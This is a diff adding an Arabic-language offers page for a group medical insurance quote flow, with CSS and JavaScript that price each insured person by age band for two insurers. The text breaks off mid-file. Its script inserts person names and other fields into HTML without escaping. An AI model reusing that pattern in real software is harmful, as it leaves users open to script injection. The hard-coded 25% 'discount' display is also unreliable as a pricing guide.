@@ -1,0 +1,1544 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>بيمة</title>
+  <link rel="icon" type="image/x-icon" href="https://b2b.om/assets/images/isc2.png">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --theme-main: #80C739;
+      --theme-main-dark: #5eac12;
+      --theme-border: #e0e0e0;
+      --theme-default5: #80C739;
+      --radius: 12px;
+      --so-main: #5eac12;
+      --so-main-light: #e6f2db;
+      --so-main-dark: #3d7a0a;
+      --so-text: #333;
+      --so-danger: #dc3545;
+      --so-danger-light: #ffe0e3;
+      --text-gray: #6c757d;
+      --primary: #0d6efd;
+    }
+    * { font-family: 'Rubik', sans-serif; }
+    body { background: #faf8f5; margin: 0; padding: 0; }
+    
+    /* Header */
+    .b2b-header { background: #fff; padding: 12px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.05); z-index: 9; position: relative; }
+    .b2b-header .container { display: flex; align-items: center; justify-content: space-between; }
+    .b2b-header .logo img { height: 50px; }
+    .b2b-header nav ul { list-style: none; display: flex; gap: 30px; margin: 0; padding: 0; align-items: center; }
+    .b2b-header nav ul li a { text-decoration: none; color: #333; font-weight: 500; font-size: 14px; }
+    .b2b-header nav ul li a:hover { color: #6b8e23; }
+    .b2b-header .header-left { display: flex; align-items: center; gap: 15px; }
+    .b2b-header .header-left a { text-decoration: none; color: #333; font-size: 14px; display: flex; align-items: center; gap: 5px; }
+    .b2b-header .header-left .globe { font-size: 18px; cursor: pointer; }
+
+    /* Page Header / Stepper */
+    .page-header { background: radial-gradient(circle, #fff3cd 0%, #fff 100%); padding: 20px 0 15px; position: relative; }
+    .page-header::after { content: ""; position: absolute; left: 0; bottom: 0; width: 100%; height: 1.3px; background: linear-gradient(to right, #5eac1200, #d1d1d1, #5eac1200); z-index: 1; }
+    .page-heading { color: #74a936; font-size: 32px; font-weight: 400; margin: 0; }
+    .sm-stepper { display: flex; flex-wrap: nowrap; justify-content: center; align-items: flex-start; width: 100%; max-width: 100%; position: relative; box-sizing: border-box; gap: 15px; overflow-x: auto; overflow-y: hidden; isolation: isolate; }
+    .sm-stepper__item { position: relative; display: flex; flex-direction: column; align-items: center; text-align: center; flex: 0 0 auto; min-inline-size: clamp(80px, 25vw, 100px); z-index: 1; }
+    .sm-stepper__item:before, .sm-stepper__item:after { content: ""; position: absolute; top: calc(12px); height: 1px; background-color: #c5dfab; pointer-events: none; z-index: -1; }
+    .sm-stepper__item:before { inset-inline-end: calc(50% + 12px); width: calc(50% - 12px + 7.5px); }
+    .sm-stepper__item:after { inset-inline-start: calc(50% + 12px); width: calc(50% - 12px + 7.5px); }
+    .sm-stepper__item:first-child:before { display: none; }
+    .sm-stepper__item:last-child:after { display: none; }
+    .sm-stepper__link, .sm-stepper__link:visited { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: inherit; }
+    .sm-stepper__circle { width: 24px; height: 24px; border-radius: 50%; background: #fff; border: 1px solid #c5dfab; display: grid; place-items: center; color: #1f2937; font-weight: 400; font-size: 16px; position: relative; z-index: 1; }
+    .sm-stepper__label { margin-top: 4px; font-size: 16px; color: #4b5563; }
+    .sm-stepper__item.sm-is-done .sm-stepper__circle { background: #c5dfab; border-color: #c5dfab; color: #5eac12; }
+    .sm-stepper__item[aria-current="step"] .sm-stepper__circle { background: #5eac12; border-color: #5eac12; color: #fff; }
+    .sm-stepper__item[aria-current="step"] .sm-stepper__label { color: #5eac12; }
+
+    /* Main Content */
+    .so-container { position: relative; }
+
+    /* Offer Cards */
+    .so-offer { border: 1px solid var(--theme-border); border-radius: var(--radius); overflow: hidden; transition: transform 0.25s, box-shadow 0.25s; margin-bottom: 1rem; background-color: #fff; box-shadow: 3.346px 3.716px 22.5px rgba(0,0,0,0.07); }
+    .so-offer:hover { box-shadow: 0 10px 20px rgba(0,0,0,0.1); border: 1px solid var(--theme-default5); }
+    .so-offer-header { display: flex; justify-content: space-between; align-items: center; padding: 1rem 1.25rem; cursor: pointer; border-bottom: 1px solid #E6F2DB; transition: background 0.2s; flex-wrap: wrap; gap: 0.75rem; }
+    .so-logo img { width: 56px; height: 56px; border-radius: 0; object-fit: cover; border: 1px solid #dee2e6; padding: 5px; }
+    .so-company { display: flex; flex-direction: column; justify-content: center; }
+    .so-name { font-weight: 700; font-size: 1.05rem; color: var(--so-text); }
+    .so-plan-name { font-size: .9rem; color: #6c757d; }
+    .so-tags { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }
+    .so-chip { display: inline-flex; align-items: center; font-size: .7rem; padding: 3px 8px; border-radius: 999px; border: 1px solid transparent; line-height: 1.2; gap: 4px; }
+    .so-chip .so-chip-icon { font-size: .85rem; vertical-align: middle; }
+    .so-offer-right { display: grid; grid-auto-flow: column; grid-auto-columns: max-content; align-items: center; justify-content: end; gap: 1rem; text-align: right; }
+    .so-price { display: flex; flex-direction: column; align-items: flex-end; text-align: end; gap: 2px; }
+    .quote-currency { display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; }
+    .quote-currency__icon { width: 20px; height: 16px; object-fit: contain; vertical-align: middle; }
+    .so-break { font-size: .8rem; color: #777; }
+    .so-choose { border-radius: var(--radius); padding: .5rem 1rem; background: var(--theme-main); border: 1px solid var(--theme-border); color: #fff; font-weight: 400; transition: 0.25s; box-shadow: 0 2px 4px rgba(0,0,0,0.12); white-space: nowrap; min-width: 120px; height: 38px; display: inline-flex; align-items: center; justify-content: center; }
+    .so-choose:hover { background: #5eac12; transform: scale(1.05); }
+    .so-collapse-btn { cursor: pointer; font-size: 1.2rem; color: #6c757d; transition: transform .3s; }
+    .so-collapse-btn.open i { transform: rotate(180deg); }
+
+    /* Offer Footer */
+    .so-offer-footer { padding: .9rem 1.25rem 1rem; background: #fbfdf8; }
+    .so-messages { display: grid; gap: 6px; }
+    .so-message { font-size: .8rem; color: #dc3545; font-weight: 700; padding: 0; display: grid; grid-template-columns: auto 1fr; gap: 6px; }
+    .so-message-index { font-weight: 700; color: #dc3545; }
+
+    /* Expanded Table Area */
+    .so-table-wrap { background: #fff; transition: 0.3s; overflow-x: auto; width: 100%; display: none; }
+    .so-table-wrap.show { display: block; }
+    .so-users-head { display: flex; justify-content: space-between; align-items: center; padding: 1rem 1.25rem; }
+    .so-users-head .btn-offer-toolbar { display: flex; align-items: center; gap: 1rem; }
+    .so-users-head .btn-offer-toolbar .btn-link { color: #0d6efd; text-decoration: none; font-size: .85rem; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
+    .so-users-head .btn-offer-toolbar .btn-link:hover { text-decoration: underline; }
+
+    .so-table { width: 100%; }
+    .so-table th { color: var(--text-gray); white-space: nowrap; font-size: .85rem; font-weight: 500; padding: .6rem .5rem; border-bottom: 1px solid #dee2e6; }
+    .so-table td { vertical-align: middle; white-space: nowrap; font-size: .85rem; padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
+    .so-table .chip-select { font-size: .8rem; padding: 4px 8px; border-radius: 6px; border: 1px solid #c5dfab; background: #f8fff0; color: #333; min-width: 120px; }
+    .network-wrapper { color: #0d6efd; font-weight: 500; font-size: .85rem; }
+    .chips { display: flex; flex-wrap: wrap; gap: .2rem; }
+    .chip { display: inline-flex; align-items: center; gap: .3rem; padding: .3rem .6rem; border-radius: 1rem; font-size: .8rem; cursor: pointer; position: relative; transition: 0.2s; border: none; }
+    .chip--selected.chip--mandatory { background: var(--primary); border-color: var(--primary); color: #fff; }
+    .chip--selected.chip--mandatory i { margin-left: 4px; }
+    .premium { font-weight: 600; }
+    .so-user-actions { display: flex; align-items: center; gap: .5rem; justify-content: flex-end; }
+    .so-toggle-details { color: #6c757d; border: none; background: none; }
+
+    /* Detail Row */
+    .so-detail-row { display: none; }
+    .so-detail-row.show { display: table-row; }
+    .so-detail-content { border-right: 3px solid var(--so-main); background: #f9fff9; border-radius: 8px; padding: 1rem; }
+    .cover-detail-header { display: grid; grid-template-columns: 1fr 1fr 1fr; font-weight: 700; padding: .5rem 0; border-bottom: 1px solid #e0e0e0; text-align: right; }
+    .cover-detail-row { display: grid; grid-template-columns: 1fr 1fr 1fr; padding: .4rem 0; border-bottom: 1px solid #f5f5f5; }
+    .cover-detail-row:last-child { border-bottom: none; }
+    .cover-detail-row.total-row { font-weight: 700; background: #f0f8e8; border-radius: 4px; padding: .5rem; margin-top: 4px; }
+
+    /* Action Buttons */
+    .div_left_right { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
+    .btn-theme-outline-gray { border: 2px solid #667085; color: #667085; background: #fff; padding: 0.9rem 1.2rem; border-radius: 0.35rem; font-weight: 500; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; height: calc(3.5rem + 4px); min-height: calc(3.5rem + 4px); line-height: 1.25; transition: all 0.25s ease; }
+    .btn-theme-outline-gray:hover { background: #667085; color: #fff; }
+
+    /* Footer */
+    .b2b-footer { background: #333; color: #fff; padding: 20px 0; margin-top: 40px; }
+    .b2b-footer .container { display: flex; justify-content: space-between; align-items: center; }
+    .b2b-footer a { color: #ccc; text-decoration: none; font-size: 13px; margin: 0 10px; }
+    .b2b-footer a:hover { color: #fff; }
+    .b2b-footer .copyright { font-size: 13px; color: #aaa; }
+
+    /* No data message */
+    .no-data-msg { text-align: center; padding: 60px 20px; color: #6c757d; }
+    .no-data-msg i { font-size: 48px; color: #ccc; margin-bottom: 15px; }
+    .no-data-msg h4 { color: #333; margin-bottom: 10px; }
+
+    /* Responsive */
+    @media (max-width: 992px) {
+      .so-offer-header { flex-direction: column; align-items: flex-start; }
+      .so-offer-right { width: 100%; justify-content: space-between; }
+    }
+    @media (max-width: 768px) {
+      .so-offer-header { padding: 0.8rem; }
+      .so-offer-right { flex-direction: column; align-items: flex-end; }
+    }
+
+
+    /* Mobile Responsive */
+    @media (max-width: 768px) {
+      /* Prevent zoom on input focus */
+      input, select, textarea { font-size: 16px !important; }
+      
+      /* Header - hamburger menu */
+      .b2b-header .container { 
+        flex-wrap: wrap; 
+        padding: 10px 15px; 
+        position: relative;
+      }
+      .b2b-header .logo img { height: 38px; }
+      .b2b-header nav { 
+        display: none;
+        width: 100%;
+        order: 3;
+        background: #fff;
+        padding: 10px 0;
+        border-top: 1px solid #eee;
+        margin-top: 10px;
+      }
+      .b2b-header nav.show { display: block; }
+      .b2b-header nav ul { 
+        flex-direction: column; 
+        gap: 0;
+        align-items: stretch;
+      }
+      .b2b-header nav ul li { 
+        border-bottom: 1px solid #f5f5f5;
+      }
+      .b2b-header nav ul li a { 
+        display: block;
+        padding: 10px 0;
+        font-size: 14px;
+      }
+      .b2b-header .header-left { 
+        gap: 10px;
+        order: 2;
+      }
+      .b2b-header .header-left a span { display: none; }
+      .b2b-header .header-left a i { font-size: 18px; }
+      .b2b-header .menu-toggle { 
+        display: flex !important;
+        order: 1;
+        background: none;
+        border: none;
+        font-size: 22px;
+        cursor: pointer;
+        padding: 5px;
+        color: #333;
+      }
+      
+      /* Page Header & Stepper */
+      .page-header { padding: 12px 0; }
+      .page-header .container { padding: 0 12px; }
+      .page-header .row { flex-direction: column; gap: 8px; }
+      .page-heading { font-size: 18px; text-align: center; margin-bottom: 8px; }
+      .sm-stepper { justify-content: center; gap: 0; }
+      .sm-stepper__item { min-width: auto; }
+      .sm-stepper__circle { width: 22px; height: 22px; font-size: 10px; }
+      .sm-stepper__label { font-size: 9px; }
+      .sm-stepper__item:not(:last-child)::after { margin: 0 4px; }
+      
+      /* Form */
+      .form-section { padding: 15px 0; }
+      .form-card { padding: 18px 12px; margin: 0 8px; max-width: 100%; }
+      .form-card h4 { font-size: 17px; }
+      .form-card .subtitle { font-size: 13px; }
+      .row-fields { flex-direction: column; gap: 0; }
+      .row-fields .form-group { flex: none; width: 100%; }
+      .form-group label { font-size: 11px; }
+      .form-control-custom { padding: 10px 12px; font-size: 16px; }
+      .phone-input { flex-direction: row; }
+      .phone-input input { font-size: 16px; }
+      .btn-submit { font-size: 15px; padding: 12px; }
+      
+      /* Tables */
+      .table-responsive { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+      .insured-table { font-size: 11px; }
+      .insured-table th, .insured-table td { padding: 6px 4px; white-space: nowrap; }
+      
+      /* Review/Checkout */
+      .review-card .row { flex-direction: column-reverse; }
+      .review-right { padding: 15px 12px; }
+      .review-left { padding: 15px 12px; border-right: none; border-top: 1px solid #eee; }
+      .summary-panel { position: static; }
+      .company-header img { width: 40px; height: 40px; }
+      .btn-buy-now { font-size: 15px; padding: 12px; }
+      .btn-prev { font-size: 13px; padding: 8px 15px; }
+      
+      /* Offers */
+      .so-offer-header { flex-direction: column; align-items: flex-start; padding: 12px; }
+      .so-offer-right { width: 100%; flex-direction: column; align-items: flex-end; }
+      
+      /* Footer */
+      .b2b-footer { margin-top: 20px; }
+      .b2b-footer .container { flex-direction: column; gap: 8px; text-align: center; }
+      .b2b-footer .footer-links { justify-content: center; flex-wrap: wrap; }
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="b2b-header">
+    <div class="container">
+      <div class="logo">
+        <a href="/"><img src="https://b2b.om/assets/images/isc2.png" alt="بيمة للأعمال"></a>
+      </div>
+      <nav>
+        <ul>
+          <li><a href="/">الصفحة الرئيسية</a></li>
+          <li><a href="javascript:void(0)">تأمين</a></li>
+          <li><a href="javascript:void(0)">من نحن</a></li>
+          <li><a href="javascript:void(0)">تواصل معنا</a></li>
+        </ul>
+      </nav>
+      <div class="header-left">
+        <span class="globe"><i class="fa-solid fa-globe"></i></span>
+        <a href="tel:96822644442"><i class="fa-solid fa-headset"></i> <span dir="ltr">968 22644442</span></a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Page Header with Stepper -->
+  <div class="page-header">
+    <div class="container">
+      <div class="row align-items-center">
+        <div class="col-12 col-md-6 text-center text-md-end">
+          <h1 class="page-heading">تأمين طبي جماعي</h1>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="sm-stepper">
+            <div class="sm-stepper__item sm-is-done">
+              <a class="sm-stepper__link"><span class="sm-stepper__circle">1</span><span class="sm-stepper__label">تفاصيل</span></a>
+            </div>
+            <div class="sm-stepper__item sm-is-done">
+              <a class="sm-stepper__link"><span class="sm-stepper__circle">2</span><span class="sm-stepper__label">سجل المطالبات</span></a>
+            </div>
+            <div class="sm-stepper__item sm-is-done">
+              <a class="sm-stepper__link"><span class="sm-stepper__circle">3</span><span class="sm-stepper__label">إضافة مؤمن عليه</span></a>
+            </div>
+            <div class="sm-stepper__item" aria-current="step">
+              <a class="sm-stepper__link"><span class="sm-stepper__circle">4</span><span class="sm-stepper__label">العروض</span></a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="container py-4 so-container">
+
+    <!-- Dynamic content will be injected here -->
+    <div id="offers-container"></div>
+
+    <!-- Navigation -->
+    <div class="div_left_right">
+      <div class="text-start">
+        <button type="button" class="btn-theme-outline-gray" onclick="window.location.href='/insurance/b2b-add-insured'">
+          <i class="fa-solid fa-arrow-left"></i> السابق
+        </button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <footer class="b2b-footer">
+    <div class="container">
+      <div class="copyright">حقوق الطبع والنشر &copy; 2026, جميع الحقوق محفوظة</div>
+      <div>
+        <a href="/">الصفحة الرئيسية</a>
+        <a href="javascript:void(0)">شروط</a>
+        <a href="javascript:void(0)">سياسة الخصوصية</a>
+        <a href="javascript:void(0)">اتصال</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    // ========== VALUE-TO-TEXT MAPPINGS (backward compat) ==========
+    var GENDER_MAP = {"1": "ذكر", "2": "أنثى"};
+    var RELATION_MAP = {"6": "الابن", "7": "الابنة", "4": "الزوج", "5": "الزوجة", "10": "الموظف"};
+    var MARITAL_MAP = {"1": "أعزب", "2": "متزوج", "3": "أرمل", "4": "مطلّق", "5": "غير ذلك"};
+
+    function resolveField(val, map) {
+      if (!val) return '';
+      // If it's a pure number, look up in map
+      if (/^\d+$/.test(val)) return map[val] || val;
+      // If it's "اختر" (placeholder), return empty
+      if (val === 'اختر') return '';
+      return val;
+    }
+
+    // ========== PRICING CONFIGURATION ==========
+    var GIG_RATES = [
+      { min: 0, max: 17, basic: 75 },
+      { min: 18, max: 25, basic: 95 },
+      { min: 26, max: 35, basic: 95 },
+      { min: 36, max: 45, basic: 112 },
+      { min: 46, max: 55, basic: 135 },
+      { min: 56, max: 65, basic: 165 },
+      { min: 66, max: 999, basic: 200 }
+    ];
+
+    var OUI_RATES = [
+      { min: 0, max: 17, basic: 120 },
+      { min: 18, max: 25, basic: 152 },
+      { min: 26, max: 35, basic: 152 },
+      { min: 36, max: 45, basic: 180 },
+      { min: 46, max: 55, basic: 215 },
+      { min: 56, max: 65, basic: 265 },
+      { min: 66, max: 999, basic: 320 }
+    ];
+
+    // ========== PER-COMPANY CONFIG ==========
+    var COMPANY_CONFIG = {
+      1: { // GIG
+        annualLimits: ['25000'],
+        network: 'A.6',
+        coverageLabel: 'التحمل',
+        planMultipliers: {
+          'طبي مثالي 1': 0.6, 'طبي مثالي 2': 0.7, 'طبي مثالي 3': 0.8,
+          'طبي مثالي 4': 0.9, 'طبي مثالي 5': 1.0, 'طبي مثالي 6': 1.1,
+          'طبي مثالي 7': 1.0
+        },
+        limitMultipliers: { '25000': 1.0 },
+        networkMap: {
+          'طبي مثالي 1': 'A.1', 'طبي مثالي 2': 'A.2', 'طبي مثالي 3': 'A.3',
+          'طبي مثالي 4': 'A.4', 'طبي مثالي 5': 'A.5', 'طبي مثالي 6': 'A.6',
+          'طبي مثالي 7': 'A.6'
+        }
+      },
+      2: { // OUI
+        annualLimits: ['3000', '5000'],
+        network: 'RN2',
+        coverageLabel: 'Dental + Optical',
+        planMultipliers: {
+          'الخطة الذهبية': 1.3, 'الخطة الفضية': 1.0, 'الخطة البلاتينية': 1.6
+        },
+        limitMultipliers: { '3000': 1.0, '5000': 1.25 },
+        networkMap: {
+          'الخطة الذهبية': 'RN2', 'الخطة الفضية': 'RN2', 'الخطة البلاتينية': 'RN1'
+        }
+      }
+    };
+
+    // ========== UTILITY FUNCTIONS ==========
+    function getBasicAmount(age, rates) {
+      for (var i = 0; i < rates.length; i++) {
+        if (age >= rates[i].min && age <= rates[i].max) return rates[i].basic;
+      }
+      return rates[rates.length - 1].basic;
+    }
+
+    function calculateAge(dobStr) {
+      // dob format from datepicker: "YYYY-MM-DD" or "DD/MM/YYYY"
+      var parts;
+      if (dobStr.indexOf('-') !== -1) {
+        parts = dobStr.split('-');
+        if (parts[0].length === 4) {
+          // YYYY-MM-DD
+          var birthYear = parseInt(parts[0]);
+          var birthMonth = parseInt(parts[1]);
+          var birthDay = parseInt(parts[2]);
+        } else {
+          // DD-MM-YYYY
+          var birthDay = parseInt(parts[0]);
+          var birthMonth = parseInt(parts[1]);
+          var birthYear = parseInt(parts[2]);
+        }
+      } else if (dobStr.indexOf('/') !== -1) {
+        parts = dobStr.split('/');
+        if (parts[2].length === 4) {
+          // DD/MM/YYYY
+          var birthDay = parseInt(parts[0]);
+          var birthMonth = parseInt(parts[1]);
+          var birthYear = parseInt(parts[2]);
+        } else {
+          // YYYY/MM/DD
+          var birthYear = parseInt(parts[0]);
+          var birthMonth = parseInt(parts[1]);
+          var birthDay = parseInt(parts[2]);
+        }
+      } else {
+        return 30; // fallback
+      }
+      var today = new Date();
+      var age = today.getFullYear() - birthYear;
+      var m = today.getMonth() + 1 - birthMonth;
+      if (m < 0 || (m === 0 && today.getDate() < birthDay)) {
+        age--;
+      }
+      return age;
+    }
+
+    function calcPricing(basic, planMult, limitMult) {
+      var adjusted = basic * (planMult || 1.0) * (limitMult || 1.0);
+      var tax = adjusted * 0.016;
+      var emergency = adjusted * 0.005;
+      var net = adjusted + tax + emergency;
+      var vat = net * 0.05;
+      var total = net + vat;
+      return {
+        basic: adjusted,
+        plan: 0,
+        deductible: 0,
+        gross: adjusted,
+        tax: tax,
+        emergency: emergency,
+        net: net,
+        vat: vat,
+        total: total
+      };
+    }
+
+    function fmt(num) {
+      return parseFloat(num.toFixed(3)).toString();
+    }
+
+    // ========== TOGGLE FUNCTIONS ==========
+    function toggleOffer(offerId) {
+      var tableWrap = document.getElementById(offerId + '-table');
+      var collapseBtn = document.querySelector('#' + offerId + ' .so-collapse-btn');
+      if (tableWrap.classList.contains('show')) {
+        tableWrap.classList.remove('show');
+        collapseBtn.querySelector('i').className = 'bi bi-chevron-down';
+      } else {
+        tableWrap.classList.add('show');
+        collapseBtn.querySelector('i').className = 'bi bi-chevron-up';
+      }
+    }
+
+    function toggleDetail(btn, detailId) {
+      var row = document.getElementById(detailId);
+      if (row.classList.contains('show')) {
+        row.classList.remove('show');
+        btn.querySelector('i').className = 'bi bi-chevron-down';
+      } else {
+        row.classList.add('show');
+        btn.querySelector('i').className = 'bi bi-chevron-up';
+      }
+    }
+
+    // ========== NETWORK FILE DOWNLOADS ==========
+    function getNetworkFile(networkCode) {
+      if (networkCode.indexOf('A.') === 0) {
+        return 'assets/OMANA.1-A.6-CategoryBAug2025.pdf';
+      } else if (networkCode.indexOf('RN') === 0) {
+        return 'assets/UICNETWORKSLIST.xls';
+      }
+      return '#';
+    }
+
+    // ========== CURRENCY SVG ==========
+    var currSvg = '<img class="quote-currency__icon" src="assets/omr-symbol.svg" alt="ر.ع">';
+
+    // ========== BUILD OFFER HTML ==========
+    function buildOfferCard(offerNum, companyName, planName, logoSrc, planSelectOptions, rates, persons) {
+      var count = persons.length;
+      var config = COMPANY_CONFIG[offerNum];
+      var defaultPlanMult = config.planMultipliers[planName] || 1.0;
+      var defaultLimitMult = config.limitMultipliers[config.annualLimits[0]] || 1.0;
+      var totalNet = 0;
+      var totalVat = 0;
+
+      // Pre-calculate pricing for each person
+      var pricingData = [];
+      for (var i = 0; i < persons.length; i++) {
+        var age = calculateAge(persons[i].dob);
+        var basic = getBasicAmount(age, rates);
+        var p = calcPricing(basic, defaultPlanMult, defaultLimitMult);
+        p.age = age;
+        p.baseBasic = basic;
+        pricingData.push(p);
+        totalNet += p.net;
+        totalVat += p.vat;
+      }
+
+      var offerId = 'offer' + offerNum;
+
+      // Build chips
+      var chipsHtml = '<span class="so-chip" style="background-color: rgb(255, 243, 205); border-color: rgb(255, 243, 205);">' +
+        '<i class="so-chip-icon fa-solid fa-user-group"></i> المؤمن عليهم &nbsp;(' + count + ')' +
+        '</span>' +
+        '<span class="so-chip" style="background-color: rgb(197, 223, 171); border-color: rgb(197, 223, 171);" title="' + planName + ' مختارة لـ ' + count + ' مؤمن عليهم">' +
+        '<i class="so-chip-icon fa-solid fa-flag"></i> ' + planName + ' &nbsp;(' + count + ')' +
+        '</span>' +
+        '<span class="so-chip" style="background-color: rgb(255, 243, 205); border-color: rgb(255, 230, 156);">' +
+        '<i class="so-chip-icon fa-regular fa-clock"></i> مدة الوثيقة &nbsp;(سنة واحدة)' +
+        '</span>';
+
+      // Build annual limit options HTML
+      var annualLimitOptions = '';
+      for (var li = 0; li < config.annualLimits.length; li++) {
+        var lv = config.annualLimits[li];
+        annualLimitOptions += '<option' + (li === 0 ? ' selected' : '') + '>' + lv + '</option>';
+      }
+
+      // Build table rows
+      var rowsHtml = '';
+      for (var i = 0; i < persons.length; i++) {
+        var person = persons[i];
+        var pr = pricingData[i];
+        var rowNum = i + 1;
+        var detailId = 'detail-' + offerNum + '-' + rowNum;
+        var rowDataAttr = 'data-offer="' + offerNum + '" data-row="' + rowNum + '" data-base="' + pr.baseBasic + '"';
+
+        rowsHtml += '<tr class="so-row" ' + rowDataAttr + '>' +
+          '<td><input type="checkbox" class="form-check-input"></td>' +
+          '<td>' + rowNum + '</td>' +
+          '<td>' + person.name + '</td>' +
+          '<td>' + resolveField(person.gender, GENDER_MAP) + '</td>' +
+          '<td>' + resolveField(person.marital, MARITAL_MAP) + '</td>' +
+          '<td>' + resolveField(person.relation, RELATION_MAP) + '</td>' +
+          '<td>' + pr.age + '</td>' +
+          '<td>' + resolveField(person.nationality, {}) + '</td>' +
+          '<td><select class="form-select form-select-sm chip-select plan-select" onchange="recalcRow(this)" data-offer="' + offerNum + '">' + planSelectOptions + '</select></td>' +
+          '<td><select class="form-select form-select-sm chip-select limit-select" onchange="recalcRow(this)" data-offer="' + offerNum + '">' + annualLimitOptions + '</select></td>' +
+          '<td class="text-center"><a href="' + getNetworkFile(config.network) + '" download class="btn btn-link btn-sm p-0"><span class="network-wrapper">' + config.network + '</span></a></td>' +
+          '<td><div class="chips"><button type="button" class="chip chip--selected chip--mandatory" disabled><i class="bi bi-check-circle"></i><span>' + config.coverageLabel + '</span></button></div></td>' +
+          '<td class="premium"><span style="text-decoration:line-through;color:#c00;font-size:0.85em;">' + fmt(pr.total) + '</span> <span class="quote-currency">' + currSvg + '<span class="row-premium">' + fmt(pr.total * 0.75) + '</span></span></td>' +
+          '<td><div class="so-user-actions"><button class="btn btn-link so-toggle-details" onclick="toggleDetail(this, \'' + detailId + '\')"><i class="bi bi-chevron-down"></i></button></div></td>' +
+          '</tr>';
+
+        // Detail row
+        var selectedLimit = config.annualLimits[0];
+        rowsHtml += '<tr class="so-detail-row" id="' + detailId + '">' +
+          '<td colspan="14"><div class="so-detail-content">' +
+          '<div class="cover-detail-header"><div>التغطيات</div><div>الحد</div><div>المبلغ ر.ع</div></div>' +
+          '<div class="cover-detail-row"><div>المبلغ الأساسي</div><div>-</div><div class="detail-basic">' + fmt(pr.basic) + '</div></div>' +
+          '<div class="cover-detail-row"><div><i class="bi bi-check-circle text-success"></i> الخطة</div><div>-</div><div>0</div></div>' +
+          '<div class="cover-detail-row"><div><i class="bi bi-check-circle text-success"></i> الحد السنوي</div><div>-</div><div class="detail-limit">' + selectedLimit + '</div></div>' +
+          '<div class="cover-detail-row"><div><i class="bi bi-check-circle text-success"></i> التحمل</div><div>-</div><div>0</div></div>' +
+          '<div class="cover-detail-row total-row"><div>المبلغ الإجمالي</div><div>-</div><div class="detail-gross">' + fmt(pr.gross) + '</div></div>' +
+          '<div class="cover-detail-row"><div>الضريبة والمساهمة</div><div>-</div><div class="detail-tax">' + fmt(pr.tax) + '</div></div>' +
+          '<div class="cover-detail-row"><div>رسوم الطوارئ</div><div>-</div><div class="detail-emergency">' + fmt(pr.emergency) + '</div></div>' +
+          '<div class="cover-detail-row total-row"><div>المبلغ الصافي</div><div>-</div><div class="detail-net">' + fmt(pr.net) + '</div></div>' +
+          '<div class="cover-detail-row"><div>ضريبة القيمة المضافة</div><div>-</div><div class="detail-vat">' + fmt(pr.vat) + '</div></div>' +
+          '<div class="cover-detail-row total-row"><div>إجمالي القسط</div><div>-</div><div class="detail-total">' + fmt(pr.total) + '</div></div>' +
+          '</div></td></tr>';
+      }
+
+      // Full offer card
+      var html = '<div class="so-offer mb-4" id="' + offerId + '">' +
+        '<div class="so-offer-header" onclick="toggleOffer(\'' + offerId + '\')">' +
+          '<div class="d-flex align-items-center gap-2">' +
+            '<div class="so-logo"><img alt="' + companyName + '" src="' + logoSrc + '"></div>' +
+            '<div class="so-company">' +
+              '<div class="so-name">' + companyName + '</div>' +
+              '<div class="so-plan-name">' + planName + '</div>' +
+              '<div class="so-tags">' + chipsHtml + '</div>' +
+            '</div>' +
+          '</div>' +
+          '<div class="so-offer-right">' +
+            '<span class="text-warning align-self-end">العرض المبدئي</span>' +
+            '<div class="so-price d-flex flex-column align-items-end text-end gap-1">' +
+              '<div style="text-decoration:line-through;color:#c00;font-size:0.85em;">' + fmt(totalNet + totalVat) + '</div>' +
+              '<div class="quote-currency">' + currSvg + '<span class="header-total">' + fmt((totalNet + totalVat) * 0.75) + '</span></div>' +
+              '<div class="so-break">+ ضريبة القيمة المضافة ' + fmt(totalVat * 0.75) + '</div>' +
+            '</div>' +
+            '<div class="d-grid gap-2 w-100"><button type="button" class="btn so-choose" data-offer="' + offerNum + '" data-company="' + companyName + '" data-plan="' + planName + '" data-logo="' + logoSrc + '" onclick="chooseOffer(this)" aria-label="اختر هذا العرض">اختر</button></div>' +
+            '<span class="so-collapse-btn"><i class="bi bi-chevron-down"></i></span>' +
+          '</div>' +
+        '</div>' +
+        '<div class="so-table-wrap" id="' + offerId + '-table">' +
+          '<div class="so-users-head">' +
+            '<div><strong>المؤمن عليهم المغطون (' + count + ')</strong></div>' +
+            '<div class="btn-offer-toolbar">' +
+              '<button type="button" class="btn btn-link"><span>عرض المزيد</span></button>' +
+              '<button type="button" class="btn btn-link"><i class="fa-regular fa-circle-down"></i> حمل سعر العرض</button>' +
+              '<button type="button" class="btn btn-link"><i class="fa-regular fa-circle-down"></i> جدول المنافع</button>' +
+            '</div>' +
+          '</div>' +
+          '<div class="table-responsive pb-3">' +
+            '<table class="so-table table align-middle mb-0">' +
+              '<thead><tr>' +
+                '<th style="width:40px"><input type="checkbox" class="form-check-input" aria-label="حدد الكل"></th>' +
+                '<th style="width:60px">#</th>' +
+                '<th>الاسم</th>' +
+                '<th>الجنس</th>' +
+                '<th>الحالة الاجتماعية</th>' +
